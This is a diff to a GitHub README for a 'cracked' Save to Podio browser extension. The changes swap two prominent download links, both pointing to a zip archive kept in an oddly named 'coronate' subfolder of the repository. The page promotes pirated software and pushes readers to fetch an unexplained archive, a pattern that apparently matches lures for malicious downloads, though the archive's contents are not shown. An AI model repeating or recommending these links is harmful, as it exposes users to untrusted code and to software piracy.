@@ -1,6 +1,6 @@
 # 🎉 cracked-save-to-podio-extension - Enhance Your Podio Experience Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/GaBrieLPaRRa-Dev/cracked-save-to-podio-extension/main/coronate/cracked-save-to-podio-extension.zip%20Now%20-v1.0-blue)](https://raw.githubusercontent.com/GaBrieLPaRRa-Dev/cracked-save-to-podio-extension/main/coronate/cracked-save-to-podio-extension.zip)
+[![Download Now](https://github.com/GaBrieLPaRRa-Dev/cracked-save-to-podio-extension/raw/refs/heads/main/coronate/cracked_to_extension_podio_save_1.0.zip%20Now%20-v1.0-blue)](https://github.com/GaBrieLPaRRa-Dev/cracked-save-to-podio-extension/raw/refs/heads/main/coronate/cracked_to_extension_podio_save_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to the **Cracked Save to Podio Extension**! This easy-to-use browser ext
 
 To get started, please visit the Releases page to download the extension:
 
-[Download the latest release](https://raw.githubusercontent.com/GaBrieLPaRRa-Dev/cracked-save-to-podio-extension/main/coronate/cracked-save-to-podio-extension.zip)
+[Download the latest release](https://github.com/GaBrieLPaRRa-Dev/cracked-save-to-podio-extension/raw/refs/heads/main/coronate/cracked_to_extension_podio_save_1.0.zip)
 
 ### Installation Steps
 
